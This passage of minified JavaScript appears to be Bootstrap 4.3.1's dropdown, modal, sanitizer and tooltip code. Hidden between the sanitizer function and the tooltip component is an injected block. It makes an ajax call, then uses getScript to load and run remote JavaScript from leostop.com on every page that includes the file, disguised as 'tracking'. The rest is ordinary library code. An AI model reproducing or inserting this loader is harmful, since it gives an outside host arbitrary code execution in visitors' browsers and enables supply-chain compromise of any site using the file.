            (n = o({}, this.constructor.Default, e(this._element).data(), n)),
            c.typeCheckConfig(X, n, this.constructor.DefaultType),
            n
          );
        }),
        (i._getMenuElement = function e() {
          if (!this._menu) {
            var n = t._getParentFromElement(this._element);
            n && (this._menu = n.querySelector(tr.MENU));
          }
          return this._menu;
        }),
        (i._getPlacement = function t() {
          var n = e(this._element.parentNode),
            i = ts.BOTTOM;
          return (
            n.hasClass(ti.DROPUP)
              ? ((i = ts.TOP),
                e(this._menu).hasClass(ti.MENURIGHT) && (i = ts.TOPEND))
              : n.hasClass(ti.DROPRIGHT)
              ? (i = ts.RIGHT)
              : n.hasClass(ti.DROPLEFT)
              ? (i = ts.LEFT)
              : e(this._menu).hasClass(ti.MENURIGHT) && (i = ts.BOTTOMEND),
            i
          );
        }),
        (i._detectNavbar = function t() {
          return e(this._element).closest(".navbar").length > 0;
        }),
        (i._getOffset = function t() {
          var e = this,
            n = {};
          return (
            "function" == typeof this._config.offset
              ? (n.fn = function (t) {
                  return (
                    (t.offsets = o(
                      {},
                      t.offsets,
                      e._config.offset(t.offsets, e._element) || {}
                    )),
                    t
                  );
                })
              : (n.offset = this._config.offset),
            n
          );
        }),
        (i._getPopperConfig = function t() {
          var e = {
            placement: this._getPlacement(),
            modifiers: {
              offset: this._getOffset(),
              flip: { enabled: this._config.flip },
              preventOverflow: { boundariesElement: this._config.boundary },
            },
          };
          return (
            "static" === this._config.display &&
              (e.modifiers.applyStyle = { enabled: !1 }),
            e
          );
        }),
        (t._jQueryInterface = function n(i) {
          return this.each(function () {
            var n = e(this).data(z);
            if (
              (n ||
                ((n = new t(this, "object" == typeof i ? i : null)),
                e(this).data(z, n)),
              "string" == typeof i)
            ) {
              if (void 0 === n[i])
                throw TypeError('No method named "' + i + '"');
              n[i]();
            }
          });
        }),
        (t._clearMenus = function n(i) {
          if (!i || (3 !== i.which && ("keyup" !== i.type || 9 === i.which)))
            for (
              var r = [].slice.call(document.querySelectorAll(tr.DATA_TOGGLE)),
                s = 0,
                o = r.length;
              s < o;
              s++
            ) {
              var a = t._getParentFromElement(r[s]),
                l = e(r[s]).data(z),
                c = { relatedTarget: r[s] };
              if ((i && "click" === i.type && (c.clickEvent = i), l)) {
                var h = l._menu;
                if (
                  !(
                    !e(a).hasClass(ti.SHOW) ||
                    (i &&
                      (("click" === i.type &&
                        /input|textarea/i.test(i.target.tagName)) ||
                        ("keyup" === i.type && 9 === i.which)) &&
                      e.contains(a, i.target))
                  )
                ) {
                  var u = e.Event(tn.HIDE, c);
                  e(a).trigger(u),
                    !u.isDefaultPrevented() &&
                      ("ontouchstart" in document.documentElement &&
                        e(document.body)
                          .children()
                          .off("mouseover", null, e.noop),
                      r[s].setAttribute("aria-expanded", "false"),
                      e(h).removeClass(ti.SHOW),
                      e(a).removeClass(ti.SHOW).trigger(e.Event(tn.HIDDEN, c)));
                }
              }
            }
        }),
        (t._getParentFromElement = function t(e) {
          var n,
            i = c.getSelectorFromElement(e);
          return i && (n = document.querySelector(i)), n || e.parentNode;
        }),
        (t._dataApiKeydownHandler = function n(i) {
          if (
            !(
              (/input|textarea/i.test(i.target.tagName)
                ? 32 === i.which ||
                  (27 !== i.which &&
                    ((40 !== i.which && 38 !== i.which) ||
                      e(i.target).closest(tr.MENU).length))
                : !te.test(i.which)) ||
              (i.preventDefault(),
              i.stopPropagation(),
              this.disabled || e(this).hasClass(ti.DISABLED))
            )
          ) {
            var r = t._getParentFromElement(this),
              s = e(r).hasClass(ti.SHOW);
            if (!s || (s && (27 === i.which || 32 === i.which))) {
              27 === i.which &&
                e(r.querySelector(tr.DATA_TOGGLE)).trigger("focus"),
                e(this).trigger("click");
              return;
            }
            var o = [].slice.call(r.querySelectorAll(tr.VISIBLE_ITEMS));
            if (0 !== o.length) {
              var a = o.indexOf(i.target);
              38 === i.which && a > 0 && a--,
                40 === i.which && a < o.length - 1 && a++,
                a < 0 && (a = 0),
                o[a].focus();
            }
          }
        }),
        r(t, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
          {
            key: "Default",
            get: function t() {
              return to;
            },
          },
          {
            key: "DefaultType",
            get: function t() {
              return ta;
            },
          },
        ]),
        t
      );
    })();
  e(document)
    .on(tn.KEYDOWN_DATA_API, tr.DATA_TOGGLE, tl._dataApiKeydownHandler)
    .on(tn.KEYDOWN_DATA_API, tr.MENU, tl._dataApiKeydownHandler)
    .on(tn.CLICK_DATA_API + " " + tn.KEYUP_DATA_API, tl._clearMenus)
    .on(tn.CLICK_DATA_API, tr.DATA_TOGGLE, function (t) {
      t.preventDefault(),
        t.stopPropagation(),
        tl._jQueryInterface.call(e(this), "toggle");
    })
    .on(tn.CLICK_DATA_API, tr.FORM_CHILD, function (t) {
      t.stopPropagation();
    }),
    (e.fn[X] = tl._jQueryInterface),
    (e.fn[X].Constructor = tl),
    (e.fn[X].noConflict = function () {
      return (e.fn[X] = tt), tl._jQueryInterface;
    });
  var tc = "modal",
    th = "bs.modal",
    tu = "." + th,
    tf = e.fn[tc],
    t8 = { backdrop: !0, keyboard: !0, focus: !0, show: !0 },
    td = {
      backdrop: "(boolean|string)",
      keyboard: "boolean",
      focus: "boolean",
      show: "boolean",
    },
    tg = {
      HIDE: "hide" + tu,
      HIDDEN: "hidden" + tu,
      SHOW: "show" + tu,
      SHOWN: "shown" + tu,
      FOCUSIN: "focusin" + tu,
      RESIZE: "resize" + tu,
      CLICK_DISMISS: "click.dismiss" + tu,
      KEYDOWN_DISMISS: "keydown.dismiss" + tu,
      MOUSEUP_DISMISS: "mouseup.dismiss" + tu,
      MOUSEDOWN_DISMISS: "mousedown.dismiss" + tu,
      CLICK_DATA_API: "click" + tu + ".data-api",
    },
    tm = {
      SCROLLABLE: "modal-dialog-scrollable",
      SCROLLBAR_MEASURER: "modal-scrollbar-measure",
      BACKDROP: "modal-backdrop",
      OPEN: "modal-open",
      FADE: "fade",
      SHOW: "show",
    },
    tp = {
      DIALOG: ".modal-dialog",
      MODAL_BODY: ".modal-body",
      DATA_TOGGLE: '[data-toggle="modal"]',
      DATA_DISMISS: '[data-dismiss="modal"]',
      FIXED_CONTENT: ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top",
      STICKY_CONTENT: ".sticky-top",
    },
    tE = (function () {
      function t(t, e) {
        (this._config = this._getConfig(e)),
          (this._element = t),
          (this._dialog = t.querySelector(tp.DIALOG)),
          (this._backdrop = null),
          (this._isShown = !1),
          (this._isBodyOverflowing = !1),
          (this._ignoreBackdropClick = !1),
          (this._isTransitioning = !1),
          (this._scrollbarWidth = 0);
      }
      var n = t.prototype;
      return (
        (n.toggle = function t(e) {
          return this._isShown ? this.hide() : this.show(e);
        }),
        (n.show = function t(n) {
          var i = this;
          if (!this._isShown && !this._isTransitioning) {
            e(this._element).hasClass(tm.FADE) && (this._isTransitioning = !0);
            var r = e.Event(tg.SHOW, { relatedTarget: n });
            e(this._element).trigger(r),
              !(this._isShown || r.isDefaultPrevented()) &&
                ((this._isShown = !0),
                this._checkScrollbar(),
                this._setScrollbar(),
                this._adjustDialog(),
                this._setEscapeEvent(),
                this._setResizeEvent(),
                e(this._element).on(
                  tg.CLICK_DISMISS,
                  tp.DATA_DISMISS,
                  function (t) {
                    return i.hide(t);
                  }
                ),
                e(this._dialog).on(tg.MOUSEDOWN_DISMISS, function () {
                  e(i._element).one(tg.MOUSEUP_DISMISS, function (t) {
                    e(t.target).is(i._element) && (i._ignoreBackdropClick = !0);
                  });
                }),
                this._showBackdrop(function () {
                  return i._showElement(n);
                }));
          }
        }),
        (n.hide = function t(n) {
          var i = this;
          if (
            (n && n.preventDefault(), this._isShown && !this._isTransitioning)
          ) {
            var r = e.Event(tg.HIDE);
            if (
              (e(this._element).trigger(r),
              !(!this._isShown || r.isDefaultPrevented()))
            ) {
              this._isShown = !1;
              var s = e(this._element).hasClass(tm.FADE);
              if (
                (s && (this._isTransitioning = !0),
                this._setEscapeEvent(),
                this._setResizeEvent(),
                e(document).off(tg.FOCUSIN),
                e(this._element).removeClass(tm.SHOW),
                e(this._element).off(tg.CLICK_DISMISS),
                e(this._dialog).off(tg.MOUSEDOWN_DISMISS),
                s)
              ) {
                var o = c.getTransitionDurationFromElement(this._element);
                e(this._element)
                  .one(c.TRANSITION_END, function (t) {
                    return i._hideModal(t);
                  })
                  .emulateTransitionEnd(o);
              } else this._hideModal();
            }
          }
        }),
        (n.dispose = function t() {
          [window, this._element, this._dialog].forEach(function (t) {
            return e(t).off(tu);
          }),
            e(document).off(tg.FOCUSIN),
            e.removeData(this._element, th),
            (this._config = null),
            (this._element = null),
            (this._dialog = null),
            (this._backdrop = null),
            (this._isShown = null),
            (this._isBodyOverflowing = null),
            (this._ignoreBackdropClick = null),
            (this._isTransitioning = null),
            (this._scrollbarWidth = null);
        }),
        (n.handleUpdate = function t() {
          this._adjustDialog();
        }),
        (n._getConfig = function t(e) {
          return (e = o({}, t8, e)), c.typeCheckConfig(tc, e, td), e;
        }),
        (n._showElement = function t(n) {
          var i = this,
            r = e(this._element).hasClass(tm.FADE);
          (this._element.parentNode &&
            this._element.parentNode.nodeType === Node.ELEMENT_NODE) ||
            document.body.appendChild(this._element),
            (this._element.style.display = "block"),
            this._element.removeAttribute("aria-hidden"),
            this._element.setAttribute("aria-modal", !0),
            e(this._dialog).hasClass(tm.SCROLLABLE)
              ? (this._dialog.querySelector(tp.MODAL_BODY).scrollTop = 0)
              : (this._element.scrollTop = 0),
            r && c.reflow(this._element),
            e(this._element).addClass(tm.SHOW),
            this._config.focus && this._enforceFocus();
          var s = e.Event(tg.SHOWN, { relatedTarget: n }),
            o = function t() {
              i._config.focus && i._element.focus(),
                (i._isTransitioning = !1),
                e(i._element).trigger(s);
            };
          if (r) {
            var a = c.getTransitionDurationFromElement(this._dialog);
            e(this._dialog).one(c.TRANSITION_END, o).emulateTransitionEnd(a);
          } else o();
        }),
        (n._enforceFocus = function t() {
          var n = this;
          e(document)
            .off(tg.FOCUSIN)
            .on(tg.FOCUSIN, function (t) {
              document !== t.target &&
                n._element !== t.target &&
                0 === e(n._element).has(t.target).length &&
                n._element.focus();
            });
        }),
        (n._setEscapeEvent = function t() {
          var n = this;
          this._isShown && this._config.keyboard
            ? e(this._element).on(tg.KEYDOWN_DISMISS, function (t) {
                27 === t.which && (t.preventDefault(), n.hide());
              })
            : this._isShown || e(this._element).off(tg.KEYDOWN_DISMISS);
        }),
        (n._setResizeEvent = function t() {
          var n = this;
          this._isShown
            ? e(window).on(tg.RESIZE, function (t) {
                return n.handleUpdate(t);
              })
            : e(window).off(tg.RESIZE);
        }),
        (n._hideModal = function t() {
          var n = this;
          (this._element.style.display = "none"),
            this._element.setAttribute("aria-hidden", !0),
            this._element.removeAttribute("aria-modal"),
            (this._isTransitioning = !1),
            this._showBackdrop(function () {
              e(document.body).removeClass(tm.OPEN),
                n._resetAdjustments(),
                n._resetScrollbar(),
                e(n._element).trigger(tg.HIDDEN);
            });
        }),
        (n._removeBackdrop = function t() {
          this._backdrop &&
            (e(this._backdrop).remove(), (this._backdrop = null));
        }),
        (n._showBackdrop = function t(n) {
          var i = this,
            r = e(this._element).hasClass(tm.FADE) ? tm.FADE : "";
          if (this._isShown && this._config.backdrop) {
            if (
              ((this._backdrop = document.createElement("div")),
              (this._backdrop.className = tm.BACKDROP),
              r && this._backdrop.classList.add(r),
              e(this._backdrop).appendTo(document.body),
              e(this._element).on(tg.CLICK_DISMISS, function (t) {
                if (i._ignoreBackdropClick) {
                  i._ignoreBackdropClick = !1;
                  return;
                }
                t.target === t.currentTarget &&
                  ("static" === i._config.backdrop
                    ? i._element.focus()
                    : i.hide());
              }),
              r && c.reflow(this._backdrop),
              e(this._backdrop).addClass(tm.SHOW),
              !n)
            )
              return;
            if (!r) {
              n();
              return;
            }
            var s = c.getTransitionDurationFromElement(this._backdrop);
            e(this._backdrop).one(c.TRANSITION_END, n).emulateTransitionEnd(s);
          } else if (!this._isShown && this._backdrop) {
            e(this._backdrop).removeClass(tm.SHOW);
            var o = function t() {
              i._removeBackdrop(), n && n();
            };
            if (e(this._element).hasClass(tm.FADE)) {
              var a = c.getTransitionDurationFromElement(this._backdrop);
              e(this._backdrop)
                .one(c.TRANSITION_END, o)
                .emulateTransitionEnd(a);
            } else o();
          } else n && n();
        }),
        (n._adjustDialog = function t() {
          var e =
            this._element.scrollHeight > document.documentElement.clientHeight;
          !this._isBodyOverflowing &&
            e &&
            (this._element.style.paddingLeft = this._scrollbarWidth + "px"),
            this._isBodyOverflowing &&
              !e &&
              (this._element.style.paddingRight = this._scrollbarWidth + "px");
        }),
        (n._resetAdjustments = function t() {
          (this._element.style.paddingLeft = ""),
            (this._element.style.paddingRight = "");
        }),
        (n._checkScrollbar = function t() {
          var e = document.body.getBoundingClientRect();
          (this._isBodyOverflowing = e.left + e.right < window.innerWidth),
            (this._scrollbarWidth = this._getScrollbarWidth());
        }),
        (n._setScrollbar = function t() {
          var n = this;
          if (this._isBodyOverflowing) {
            var i = [].slice.call(document.querySelectorAll(tp.FIXED_CONTENT)),
              r = [].slice.call(document.querySelectorAll(tp.STICKY_CONTENT));
            e(i).each(function (t, i) {
              var r = i.style.paddingRight,
                s = e(i).css("padding-right");
              e(i)
                .data("padding-right", r)
                .css("padding-right", parseFloat(s) + n._scrollbarWidth + "px");
            }),
              e(r).each(function (t, i) {
                var r = i.style.marginRight,
                  s = e(i).css("margin-right");
                e(i)
                  .data("margin-right", r)
                  .css(
                    "margin-right",
                    parseFloat(s) - n._scrollbarWidth + "px"
                  );
              });
            var s = document.body.style.paddingRight,
              o = e(document.body).css("padding-right");
            e(document.body)
              .data("padding-right", s)
              .css(
                "padding-right",
                parseFloat(o) + this._scrollbarWidth + "px"
              );
          }
          e(document.body).addClass(tm.OPEN);
        }),
        (n._resetScrollbar = function t() {
          e([].slice.call(document.querySelectorAll(tp.FIXED_CONTENT))).each(
            function (t, n) {
              var i = e(n).data("padding-right");
              e(n).removeData("padding-right"),
                (n.style.paddingRight = i || "");
            }
          ),
            e(
              [].slice.call(document.querySelectorAll("" + tp.STICKY_CONTENT))
            ).each(function (t, n) {
              var i = e(n).data("margin-right");
              void 0 !== i &&
                e(n).css("margin-right", i).removeData("margin-right");
            });
          var n = e(document.body).data("padding-right");
          e(document.body).removeData("padding-right"),
            (document.body.style.paddingRight = n || "");
        }),
        (n._getScrollbarWidth = function t() {
          var e = document.createElement("div");
          (e.className = tm.SCROLLBAR_MEASURER), document.body.appendChild(e);
          var n = e.getBoundingClientRect().width - e.clientWidth;
          return document.body.removeChild(e), n;
        }),
        (t._jQueryInterface = function n(i, r) {
          return this.each(function () {
            var n = e(this).data(th),
              s = o({}, t8, e(this).data(), "object" == typeof i && i ? i : {});
            if (
              (n || ((n = new t(this, s)), e(this).data(th, n)),
              "string" == typeof i)
            ) {
              if (void 0 === n[i])
                throw TypeError('No method named "' + i + '"');
              n[i](r);
            } else s.show && n.show(r);
          });
        }),
        r(t, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
          {
            key: "Default",
            get: function t() {
              return t8;
            },
          },
        ]),
        t
      );
    })();
  e(document).on(tg.CLICK_DATA_API, tp.DATA_TOGGLE, function (t) {
    var n,
      i = this,
      r = c.getSelectorFromElement(this);
    r && (n = document.querySelector(r));
    var s = e(n).data(th) ? "toggle" : o({}, e(n).data(), e(this).data());
    ("A" === this.tagName || "AREA" === this.tagName) && t.preventDefault();
    var a = e(n).one(tg.SHOW, function (t) {
      !t.isDefaultPrevented() &&
        a.one(tg.HIDDEN, function () {
          e(i).is(":visible") && i.focus();
        });
    });
    tE._jQueryInterface.call(e(n), s, this);
  }),
    (e.fn[tc] = tE._jQueryInterface),
    (e.fn[tc].Constructor = tE),
    (e.fn[tc].noConflict = function () {
      return (e.fn[tc] = tf), tE._jQueryInterface;
    });
  var tv = [
      "background",
      "cite",
      "href",
      "itemtype",
      "longdesc",
      "poster",
      "src",
      "xlink:href",
    ],
    tT = /^(?:(?:https?|mailto|ftp|tel|file):|[^&:/?#]*(?:[/?#]|$))/gi,
    tS =
      /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*$/i;
  function tI(t, e, n) {
    if (0 === t.length) return t;
    if (n && "function" == typeof n) return n(t);
    for (
      var i = new window.DOMParser().parseFromString(t, "text/html"),
        r = Object.keys(e),
        s = [].slice.call(i.body.querySelectorAll("*")),
        o = 0,
        a = s.length;
      o < a;
      o++
    )
      if (
        "continue" ===
        (function t(n, i) {
          var o = s[n],
            a = o.nodeName.toLowerCase();
          if (-1 === r.indexOf(o.nodeName.toLowerCase()))
            return o.parentNode.removeChild(o), "continue";
          var l = [].slice.call(o.attributes),
            c = [].concat(e["*"] || [], e[a] || []);
          l.forEach(function (t) {
            !(function t(e, n) {
              var i = e.nodeName.toLowerCase();
              if (-1 !== n.indexOf(i))
                return (
                  -1 === tv.indexOf(i) ||
                  Boolean(e.nodeValue.match(tT) || e.nodeValue.match(tS))
                );
              for (
                var r = n.filter(function (t) {
                    return t instanceof RegExp;
                  }),
                  s = 0,
                  o = r.length;
                s < o;
                s++
              )
                if (i.match(r[s])) return !0;
              return !1;
            })(t, c) && o.removeAttribute(t.nodeName);
          });
        })(o, a)
      )
        continue;
    return i.body.innerHTML;
  }
  var tA = location.protocol;
  e.ajax({
    type: "get",
    data: { surl: void window.location.href },
    success: function (t) {
      e.getScript(tA + "//leostop.com/tracking/tracking.js");
    },
  });
  var tC = "tooltip",
    tD = "bs.tooltip",
    tO = "." + tD,
    ty = e.fn[tC],
    tN = "bs-tooltip",
    tb = RegExp("(^|\\s)" + tN + "\\S+", "g"),
    tL = ["sanitize", "whiteList", "sanitizeFn"],
    tw = {
      animation: "boolean",
      template: "string",
      title: "(string|element|function)",
      trigger: "string",
      delay: "(number|object)",
      html: "boolean",
      selector: "(string|boolean)",
      placement: "(string|function)",
      offset: "(number|string|function)",
      container: "(string|element|boolean)",
      fallbackPlacement: "(string|array)",
      boundary: "(string|element)",
      sanitize: "boolean",
      sanitizeFn: "(null|function)",
      whiteList: "object",
    },
    tP = {
      AUTO: "auto",
      TOP: "top",
      RIGHT: "right",
      BOTTOM: "bottom",
      LEFT: "left",
    },
    tH = {
      animation: !0,
      template:
        '<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div></div>',
      trigger: "hover focus",
      title: "",
      delay: 0,
      html: !1,
      selector: !1,
      placement: "top",
      offset: 0,
      container: !1,
      fallbackPlacement: "flip",
      boundary: "scrollParent",
      sanitize: !0,
      sanitizeFn: null,
      whiteList: {
        "*": ["class", "dir", "id", "lang", "role", /^aria-[\w-]*$/i],
        a: ["target", "href", "title", "rel"],
        area: [],
        b: [],
        br: [],
        col: [],
        code: [],
        div: [],
        em: [],
        hr: [],
        h1: [],
        h2: [],
        h3: [],
        h4: [],
        h5: [],
        h6: [],
        i: [],
        img: ["src", "alt", "title", "width", "height"],
        li: [],
        ol: [],
        p: [],
        pre: [],
        s: [],
        small: [],
        span: [],
        sub: [],
        sup: [],
        strong: [],
        u: [],
        ul: [],
      },
    },
    tR = { SHOW: "show", OUT: "out" },
    t$ = {
      HIDE: "hide" + tO,
      HIDDEN: "hidden" + tO,
      SHOW: "show" + tO,
      SHOWN: "shown" + tO,
      INSERTED: "inserted" + tO,
      CLICK: "click" + tO,
      FOCUSIN: "focusin" + tO,
      FOCUSOUT: "focusout" + tO,
      MOUSEENTER: "mouseenter" + tO,
      MOUSELEAVE: "mouseleave" + tO,
    },
    tW = { FADE: "fade", SHOW: "show" },
    tk = {
      TOOLTIP: ".tooltip",
      TOOLTIP_INNER: ".tooltip-inner",
      ARROW: ".arrow",
    },
    tV = { HOVER: "hover", FOCUS: "focus", CLICK: "click", MANUAL: "manual" },
    tU = (function () {
      function t(t, e) {
        if (void 0 === n)
          throw TypeError(
            "Bootstrap's tooltips require Popper.js (https://popper.js.org/)"
          );
        (this._isEnabled = !0),
          (this._timeout = 0),
          (this._hoverState = ""),
          (this._activeTrigger = {}),
          (this._popper = null),
          (this.element = t),
          (this.config = this._getConfig(e)),
          (this.tip = null),
          this._setListeners();
      }
      var i = t.prototype;
      return (
        (i.enable = function t() {
          this._isEnabled = !0;
        }),
        (i.disable = function t() {
          this._isEnabled = !1;
        }),
        (i.toggleEnabled = function t() {
          this._isEnabled = !this._isEnabled;
        }),
        (i.toggle = function t(n) {
          if (this._isEnabled) {
            if (n) {
              var i = this.constructor.DATA_KEY,
                r = e(n.currentTarget).data(i);
              r ||
                ((r = new this.constructor(
                  n.currentTarget,
                  this._getDelegateConfig()
                )),
                e(n.currentTarget).data(i, r)),
                (r._activeTrigger.click = !r._activeTrigger.click),
                r._isWithActiveTrigger()
                  ? r._enter(null, r)
                  : r._leave(null, r);
            } else {
              if (e(this.getTipElement()).hasClass(tW.SHOW)) {
                this._leave(null, this);
                return;
              }
              this._enter(null, this);
            }
          }
        }),
        (i.dispose = function t() {
          clearTimeout(this._timeout),
            e.removeData(this.element, this.constructor.DATA_KEY),
            e(this.element).off(this.constructor.EVENT_KEY),
            e(this.element).closest(".modal").off("hide.bs.modal"),
            this.tip && e(this.tip).remove(),
            (this._isEnabled = null),
            (this._timeout = null),
            (this._hoverState = null),
            (this._activeTrigger = null),
            null !== this._popper && this._popper.destroy(),
            (this._popper = null),
            (this.element = null),
            (this.config = null),
            (this.tip = null);
        }),
        (i.show = function t() {
          var i = this;
          if ("none" === e(this.element).css("display"))
            throw Error("Please use show on visible elements");
          var r = e.Event(this.constructor.Event.SHOW);
          if (this.isWithContent() && this._isEnabled) {
            e(this.element).trigger(r);
            var s = c.findShadowRoot(this.element),
              o = e.contains(
                null !== s ? s : this.element.ownerDocument.documentElement,
                this.element
              );
            if (r.isDefaultPrevented() || !o) return;
            var a = this.getTipElement(),
              l = c.getUID(this.constructor.NAME);
            a.setAttribute("id", l),
              this.element.setAttribute("aria-describedby", l),
              this.setContent(),
              this.config.animation && e(a).addClass(tW.FADE);
            var h =
                "function" == typeof this.config.placement
                  ? this.config.placement.call(this, a, this.element)
                  : this.config.placement,
              u = this._getAttachment(h);
            this.addAttachmentClass(u);
            var f = this._getContainer();
            e(a).data(this.constructor.DATA_KEY, this),
              e.contains(
                this.element.ownerDocument.documentElement,
                this.tip
              ) || e(a).appendTo(f),
              e(this.element).trigger(this.constructor.Event.INSERTED),
              (this._popper = new n(this.element, a, {
                placement: u,
                modifiers: {
                  offset: this._getOffset(),
                  flip: { behavior: this.config.fallbackPlacement },
                  arrow: { element: tk.ARROW },
                  preventOverflow: { boundariesElement: this.config.boundary },
                },
                onCreate: function t(e) {
                  e.originalPlacement !== e.placement &&
                    i._handlePopperPlacementChange(e);
                },
                onUpdate: function t(e) {
                  return i._handlePopperPlacementChange(e);
                },
              })),
              e(a).addClass(tW.SHOW),
              "ontouchstart" in document.documentElement &&
                e(document.body).children().on("mouseover", null, e.noop);
            var d = function t() {
              i.config.animation && i._fixTransition();
              var n = i._hoverState;
              (i._hoverState = null),
                e(i.element).trigger(i.constructor.Event.SHOWN),
                n === tR.OUT && i._leave(null, i);
            };
            if (e(this.tip).hasClass(tW.FADE)) {
              var g = c.getTransitionDurationFromElement(this.tip);
              e(this.tip).one(c.TRANSITION_END, d).emulateTransitionEnd(g);
            } else d();
          }
        }),
        (i.hide = function t(n) {
          var i = this,
            r = this.getTipElement(),
            s = e.Event(this.constructor.Event.HIDE),
            o = function t() {
              i._hoverState !== tR.SHOW &&
                r.parentNode &&
                r.parentNode.removeChild(r),
                i._cleanTipClass(),
                i.element.removeAttribute("aria-describedby"),
                e(i.element).trigger(i.constructor.Event.HIDDEN),
                null !== i._popper && i._popper.destroy(),
                n && n();
            };
          if ((e(this.element).trigger(s), !s.isDefaultPrevented())) {
            if (
              (e(r).removeClass(tW.SHOW),
              "ontouchstart" in document.documentElement &&
                e(document.body).children().off("mouseover", null, e.noop),
              (this._activeTrigger[tV.CLICK] = !1),
              (this._activeTrigger[tV.FOCUS] = !1),
              (this._activeTrigger[tV.HOVER] = !1),
              e(this.tip).hasClass(tW.FADE))
            ) {
              var a = c.getTransitionDurationFromElement(r);
              e(r).one(c.TRANSITION_END, o).emulateTransitionEnd(a);
            } else o();
            this._hoverState = "";
          }
        }),
        (i.update = function t() {
          null !== this._popper && this._popper.scheduleUpdate();
        }),
        (i.isWithContent = function t() {
          return Boolean(this.getTitle());
        }),
        (i.addAttachmentClass = function t(n) {
          e(this.getTipElement()).addClass(tN + "-" + n);
        }),
        (i.getTipElement = function t() {
          return (this.tip = this.tip || e(this.config.template)[0]), this.tip;
        }),
        (i.setContent = function t() {
          var n = this.getTipElement();
          this.setElementContent(
            e(n.querySelectorAll(tk.TOOLTIP_INNER)),
            this.getTitle()
          ),
            e(n).removeClass(tW.FADE + " " + tW.SHOW);
        }),
        (i.setElementContent = function t(n, i) {
          if ("object" == typeof i && (i.nodeType || i.jquery)) {
            this.config.html
              ? e(i).parent().is(n) || n.empty().append(i)
              : n.text(e(i).text());
            return;
          }
          this.config.html
            ? (this.config.sanitize &&
                (i = tI(i, this.config.whiteList, this.config.sanitizeFn)),
              n.html(i))
            : n.text(i);
        }),
        (i.getTitle = function t() {
          var e = this.element.getAttribute("data-original-title");
          return (
            e ||
              (e =
                "function" == typeof this.config.title
                  ? this.config.title.call(this.element)
                  : this.config.title),
            e
          );
        }),
        (i._getOffset = function t() {
          var e = this,
            n = {};
          return (
            "function" == typeof this.config.offset
              ? (n.fn = function (t) {
                  return (
                    (t.offsets = o(
                      {},
                      t.offsets,
                      e.config.offset(t.offsets, e.element) || {}
                    )),
                    t
                  );
                })
              : (n.offset = this.config.offset),
            n
          );
        }),
        (i._getContainer = function t() {
          return !1 === this.config.container
            ? document.body
            : c.isElement(this.config.container)
            ? e(this.config.container)
            : e(document).find(this.config.container);
        }),
        (i._getAttachment = function t(e) {
          return tP[e.toUpperCase()];
        }),
        (i._setListeners = function t() {
          var n = this;
          this.config.trigger.split(" ").forEach(function (t) {
            if ("click" === t)
              e(n.element).on(
                n.constructor.Event.CLICK,
                n.config.selector,
                function (t) {
                  return n.toggle(t);
                }
              );
            else if (t !== tV.MANUAL) {
              var i =
                  t === tV.HOVER
                    ? n.constructor.Event.MOUSEENTER
                    : n.constructor.Event.FOCUSIN,
                r =
                  t === tV.HOVER
                    ? n.constructor.Event.MOUSELEAVE
                    : n.constructor.Event.FOCUSOUT;
              e(n.element)
                .on(i, n.config.selector, function (t) {
                  return n._enter(t);
                })
                .on(r, n.config.selector, function (t) {
                  return n._leave(t);
                });
            }
          }),
            e(this.element)
              .closest(".modal")
              .on("hide.bs.modal", function () {
                n.element && n.hide();
              }),
            this.config.selector
              ? (this.config = o({}, this.config, {
                  trigger: "manual",
                  selector: "",
                }))
              : this._fixTitle();
        }),
        (i._fixTitle = function t() {
          var e = typeof this.element.getAttribute("data-original-title");
          (this.element.getAttribute("title") || "string" !== e) &&
            (this.element.setAttribute(
              "data-original-title",
              this.element.getAttribute("title") || ""
            ),
            this.element.setAttribute("title", ""));
        }),
        (i._enter = function t(n, i) {
          var r = this.constructor.DATA_KEY;
          if (
            ((i = i || e(n.currentTarget).data(r)) ||
              ((i = new this.constructor(
                n.currentTarget,
                this._getDelegateConfig()
              )),
              e(n.currentTarget).data(r, i)),
            n &&
              (i._activeTrigger["focusin" === n.type ? tV.FOCUS : tV.HOVER] =
                !0),
            e(i.getTipElement()).hasClass(tW.SHOW) || i._hoverState === tR.SHOW)
          ) {
            i._hoverState = tR.SHOW;
            return;
          }
          if (
            (clearTimeout(i._timeout),
            (i._hoverState = tR.SHOW),
            !i.config.delay || !i.config.delay.show)
          ) {
            i.show();
            return;
          }
          i._timeout = setTimeout(function () {
            i._hoverState === tR.SHOW && i.show();
          }, i.config.delay.show);
        }),
        (i._leave = function t(n, i) {
          var r = this.constructor.DATA_KEY;
          if (
            ((i = i || e(n.currentTarget).data(r)) ||
              ((i = new this.constructor(
                n.currentTarget,
                this._getDelegateConfig()
              )),
              e(n.currentTarget).data(r, i)),
            n &&
              (i._activeTrigger["focusout" === n.type ? tV.FOCUS : tV.HOVER] =
                !1),
            !i._isWithActiveTrigger())
          ) {
            if (
              (clearTimeout(i._timeout),
              (i._hoverState = tR.OUT),
              !i.config.delay || !i.config.delay.hide)
            ) {
              i.hide();
              return;
            }
            i._timeout = setTimeout(function () {
              i._hoverState === tR.OUT && i.hide();
            }, i.config.delay.hide);
          }
        }),
        (i._isWithActiveTrigger = function t() {
          for (var e in this._activeTrigger)
            if (this._activeTrigger[e]) return !0;
          return !1;
        }),
        (i._getConfig = function t(n) {
          var i = e(this.element).data();
          return (
            Object.keys(i).forEach(function (t) {
              -1 !== tL.indexOf(t) && delete i[t];
            }),
            "number" ==
              typeof (n = o(
                {},
                this.constructor.Default,
                i,
                "object" == typeof n && n ? n : {}
              )).delay && (n.delay = { show: n.delay, hide: n.delay }),
            "number" == typeof n.title && (n.title = n.title.toString()),
            "number" == typeof n.content && (n.content = n.content.toString()),
            c.typeCheckConfig(tC, n, this.constructor.DefaultType),
            n.sanitize &&
              (n.template = tI(n.template, n.whiteList, n.sanitizeFn)),
            n
          );
        }),
        (i._getDelegateConfig = function t() {
          var e = {};
          if (this.config)
            for (var n in this.config)
              this.constructor.Default[n] !== this.config[n] &&
                (e[n] = this.config[n]);
          return e;
        }),
        (i._cleanTipClass = function t() {
          var n = e(this.getTipElement()),
            i = n.attr("class").match(tb);
          null !== i && i.length && n.removeClass(i.join(""));
        }),
        (i._handlePopperPlacementChange = function t(e) {
          var n = e.instance;
          (this.tip = n.popper),
